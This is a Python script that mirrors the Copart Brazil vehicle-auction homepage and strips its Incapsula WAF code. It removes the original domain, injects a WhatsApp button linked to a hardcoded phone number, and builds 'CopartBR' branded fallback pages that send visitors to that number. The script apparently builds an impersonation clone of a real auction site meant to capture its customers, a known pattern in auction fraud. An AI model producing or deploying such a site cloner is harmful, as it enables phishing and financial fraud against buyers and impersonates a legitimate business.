import os
import re
import time
import hashlib
import urllib.parse
import gc
from collections import deque
from typing import Set, Optional

import requests
from bs4 import BeautifulSoup

"""
Espelhamento Direto do Copart - Remoção COMPLETA do Incapsula
"""

BASE_URL = "https://www.copart.com.br"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
}

# Diretórios de output
OUTPUT_DIR = "public"
STATIC_DIR = os.path.join(OUTPUT_DIR, "static")

# ===================== utils =====================

def only_digits(s: str) -> str:
    return re.sub(r"\D+", "", s or "")

def get_whatsapp_number() -> str:
    return only_digits(os.environ.get("WHATSAPP_NUMBER", "5511958462009"))

def normalizar_caminho(url_path: str) -> str:
    parsed = urllib.parse.urlparse(url_path)
    path = parsed.path
    if not path.startswith("/"):
        path = "/" + path
    return path.rstrip("/") or "/"

def sanitize_filename(url_path: str) -> str:
    path = url_path.split("?")[0].split("#")[0]
    path = path.replace("\\", "/").lstrip("/")
    clean_parts = []
    for part in os.path.normpath(path).split("/"):
        if part in ("", ".", ".."):
            continue
        clean_part = re.sub(r'[<>:"/\\|?*#&]', "_", part)
        if len(clean_part) > 50:
            clean_part = clean_part[:40] + "_" + hashlib.md5(part.encode()).hexdigest()[:8]
        clean_parts.append(clean_part)
    return "/".join(clean_parts) if clean_parts else "index"

# ===================== downloads =====================

def baixar_arquivo(url: str, destino: str) -> bool:
    if not url or url.startswith(("data:", "blob:", "javascript:")):
        return False

    try:
        if os.path.exists(destino):
            return True
            
        os.makedirs(os.path.dirname(destino), exist_ok=True)
        
        resp = requests.get(url, headers=HEADERS, timeout=15, stream=True)
        if resp.status_code == 200:
            with open(destino, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return True
    except Exception as e:
        print(f"[!] Erro ao baixar {url}: {e}")
    return False

def baixar_pagina_html(url: str) -> Optional[str]:
    try:
        resp = requests.get(url, headers=HEADERS, timeout=30)
        if resp.status_code == 200:
            return resp.text
    except Exception as e:
        print(f"[!] Erro ao baixar página {url}: {e}")
    return None

# ===================== processamento =====================

def remover_incapsula_completamente(html: str) -> str:
    """Remoção AGESSIVA de tudo relacionado ao Incapsula"""
    
    # Padrões para remover
    patterns = [
        # Scripts do Incapsula
        r'<script[^>]*>.*?incapsula.*?<\/script>',
        r'<script[^>]*>.*?_Incapsula.*?<\/script>',
        r'<script[^>]*>.*?noscript.*?<\/script>',
        
        # Iframes do Incapsula
        r'<iframe[^>]*>.*?incapsula.*?<\/iframe>',
        r'<iframe[^>]*>.*?_Incapsula.*?<\/iframe>',
        
        # Links e recursos
        r'_Incapsula_Resource[^"]*',
        r'incapsula[^"]*',
        
        # Comentários e metatags
        r'<!--.*?Incapsula.*?-->',
        r'<!--.*?noscript.*?-->',
        r'<meta[^>]*incapsula[^>]*>',
        
        # Cookies e localStorage
        r'incap_*',
        r'visid_*',
        
        # Outros padrões comuns de WAF
        r'noscript.*?img.*?src=.*?Incapsula.*?<\/noscript>',
        r'div[^>]*id.*?incapsula[^>]*>.*?<\/div>',
    ]
    
    for pattern in patterns:
        html = re.sub(pattern, '', html, flags=re.IGNORECASE | re.DOTALL)
    
    return html

def limpar_html_avancado(html: str) -> str:
    """Limpeza avançada do HTML"""
    
    # Primeiro remover Incapsula completamente
    html = remover_incapsula_completamente(html)
    
    # Remover scripts problemáticos
    html = re.sub(r'<script[^>]*>.*?document\.cookie.*?<\/script>', '', html, flags=re.IGNORECASE | re.DOTALL)
    html = re.sub(r'<script[^>]*>.*?localStorage.*?<\/script>', '', html, flags=re.IGNORECASE | re.DOTALL)
    html = re.sub(r'<script[^>]*>.*?sessionStorage.*?<\/script>', '', html, flags=re.IGNORECASE | re.DOTALL)
    
    # Remover event listeners problemáticos
    html = re.sub(r'onload=.*?["\']', '', html, flags=re.IGNORECASE)
    html = re.sub(r'onerror=.*?["\']', '', html, flags=re.IGNORECASE)
    
    return html

def processar_recursos_seguros(soup: BeautifulSoup, page_url: str) -> None:
    """Processa apenas recursos seguros"""
    for tag in soup.find_all(["link", "script", "img", "source"]):
        attr = "src" if tag.name in ["script", "img", "source"] else "href"
        url = tag.get(attr, "")
        
        if not url or url.startswith(("data:", "blob:", "javascript:")):
            continue
            
        # REMOVER COMPLETAMENTE qualquer recurso do Incapsula
        if "incapsula" in url.lower() or "_Incapsula_Resource" in url:
            tag.decompose()
            continue
            
        # Remover scripts externos potencialmente problemáticos
        if tag.name == "script" and url and not url.startswith(BASE_URL):
            tag.decompose()
            continue
            
        # Processar apenas recursos da própria origem
        if url.startswith("http"):
            if not url.startswith(BASE_URL):
                tag.decompose()
                continue
            abs_url = url
        else:
            abs_url = urllib.parse.urljoin(BASE_URL, url)
        
        sanitized = sanitize_filename(url)
        local_path = os.path.join(STATIC_DIR, sanitized)
        
        # Baixar apenas recursos essenciais (CSS, imagens, fonts)
        if any(ext in url.lower() for ext in ['.css', '.jpg', '.jpeg', '.png', '.gif', '.svg', '.woff', '.woff2', '.ttf']):
            if not os.path.exists(local_path):
                success = baixar_arquivo(abs_url, local_path)
                if not success:
                    continue
            
            tag[attr] = f"./static/{sanitized}"
        else:
            # Remover outros recursos não essenciais
            tag.decompose()

def criar_botao_whatsapp(soup: BeautifulSoup, numero: str) -> None:
    """Cria botão do WhatsApp com CSS puro (sem dependências)"""
    if not soup.body:
        return

    # Criar estilo CSS inline para o botão
    estilo = soup.new_tag('style')
    estilo.string = """
    .wa-button {
        position: fixed;
        bottom: 20px;
        right: 20px;
        z-index: 10000;
        background: #25D366;
        width: 60px;
        height: 60px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        transition: all 0.3s ease;
        text-decoration: none;
    }
    .wa-button:hover {
        transform: scale(1.1);
        box-shadow: 0 6px 20px rgba(0,0,0,0.4);
        background: #128C7E;
    }
    .wa-icon {
        color: white;
        font-size: 30px;
        font-weight: bold;
    }
    """
    soup.head.append(estilo)

    # Criar o botão
    a = soup.new_tag("a")
    a['href'] = f"https://wa.me/{numero}" if numero else "https://wa.me/"
    a['class'] = "wa-button"
    a['target'] = "_blank"
    a['title'] = "Fale conosco no WhatsApp"
    
    span = soup.new_tag("span")
    span['class'] = "wa-icon"
    span.string = "💬"
    
    a.append(span)
    soup.body.append(a)

def garantir_html_valido(soup: BeautifulSoup) -> None:
    """Garante que o HTML seja válido e funcional"""
    if not soup.find('html'):
        return
        
    # Garantir head e body
    if not soup.head:
        soup.html.insert(0, soup.new_tag('head'))
    if not soup.body:
        soup.html.append(soup.new_tag('body'))
        
    # Metatags essenciais
    head = soup.head
    if not head.find('meta', attrs={'charset': True}):
        meta = soup.new_tag('meta', charset='utf-8')
        head.insert(0, meta)
    
    if not head.find('meta', attrs={'name': 'viewport'}):
        meta = soup.new_tag('meta', name='viewport', content='width=device-width, initial-scale=1.0')
        head.insert(1, meta)
    
    # Base tag para recursos relativos
    if not head.find('base'):
        base = soup.new_tag('base', href='./')
        head.insert(0, base)
    
    # Title mínimo se não existir
    if not head.find('title'):
        title = soup.new_tag('title')
        title.string = "CopartBR - Leilão de Veículos"
        head.append(title)

def processar_pagina_segura(url_path: str, html: str, numero_whatsapp: str) -> bool:
    """Processamento seguro da página"""
    try:
        # Limpeza agressiva
        html = limpar_html_avancado(html)
        html = html.replace(BASE_URL, "")
        html = html.replace("www.copart.com.br", "")
        
        soup = BeautifulSoup(html, "html.parser")
        
        # Garantir estrutura válida
        garantir_html_valido(soup)
        
        # Processar apenas recursos seguros
        processar_recursos_seguros(soup, BASE_URL + url_path)
        
        # Adicionar WhatsApp
        criar_botao_whatsapp(soup, numero_whatsapp)
        
        # Determinar caminho de output
        if url_path == "/":
            output_path = os.path.join(OUTPUT_DIR, "index.html")
        else:
            slug = sanitize_filename(url_path)
            output_path = os.path.join(OUTPUT_DIR, f"{slug}.html")
        
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        
        # Salvar HTML limpo
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(str(soup))
        
        print(f"[✓] Página processada: {url_path}")
        return True
        
    except Exception as e:
        print(f"[!] Erro crítico processando {url_path}: {e}")
        # Criar página fallback em caso de erro
        criar_pagina_fallback(url_path, numero_whatsapp)
        return False

def criar_pagina_fallback(url_path: str, numero_whatsapp: str):
    """Cria página fallback se o processamento falhar"""
    try:
        if url_path == "/":
            output_path = os.path.join(OUTPUT_DIR, "index.html")
        else:
            slug = sanitize_filename(url_path)
            output_path = os.path.join(OUTPUT_DIR, f"{slug}.html")
        
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        
        fallback_html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CopartBR - Leilão de Veículos</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 40px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 600px;
        }}
        h1 {{
            font-size: 2.5em;
            margin-bottom: 20px;
            color: white;
        }}
        p {{
            font-size: 1.2em;
            margin-bottom: 30px;
            line-height: 1.6;
        }}
        .wa-button {{
            background: #25D366;
            color: white;
            padding: 15px 30px;
            border-radius: 50px;
            text-decoration: none;
            font-weight: bold;
            font-size: 1.1em;
            transition: all 0.3s ease;
            display: inline-block;
            margin: 10px;
        }}
        .wa-button:hover {{
            background: #128C7E;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚗 CopartBR</h1>
        <p>Leilão de veículos online - Site em manutenção</p>
        <p>Estamos trabalhando para melhorar sua experiência.</p>
        
        <a href="https://wa.me/{numero_whatsapp}" class="wa-button" target="_blank">
            💬 Fale conosco no WhatsApp
        </a>
        
        <p><small>Página: {url_path}</small></p>
    </div>
</body>
</html>
        """
        
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(fallback_html)
        
        print(f"[🛡️] Página fallback criada: {url_path}")
        
    except Exception as e:
        print(f"[💥] Erro ao criar fallback: {e}")

# ===================== espelhamento principal =====================

def espelhar_site():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(STATIC_DIR, exist_ok=True)
    
    print("[🚀] Iniciando espelhamento SEGURO do Copart...")
    
    # Apenas página inicial para começar
    paginas_essenciais = ["/"]
    
    visitados = set()
    numero_whatsapp = get_whatsapp_number()
    
    for url_path in paginas_essenciais:
        if url_path in visitados:
            continue
            
        print(f"[📋] Processando: {url_path}")
        
        full_url = BASE_URL + url_path
        html = baixar_pagina_html(full_url)
        
        if html:
            processar_pagina_segura(url_path, html, numero_whatsapp)
        else:
            criar_pagina_fallback(url_path, numero_whatsapp)
        
        visitados.add(url_path)
        time.sleep(2)
    
    print("[✅] Espelhamento concluído!")
    print(f"[🌐] Arquivos em: {os.path.abspath(OUTPUT_DIR)}")

if __name__ == "__main__":
    espelhar_site()
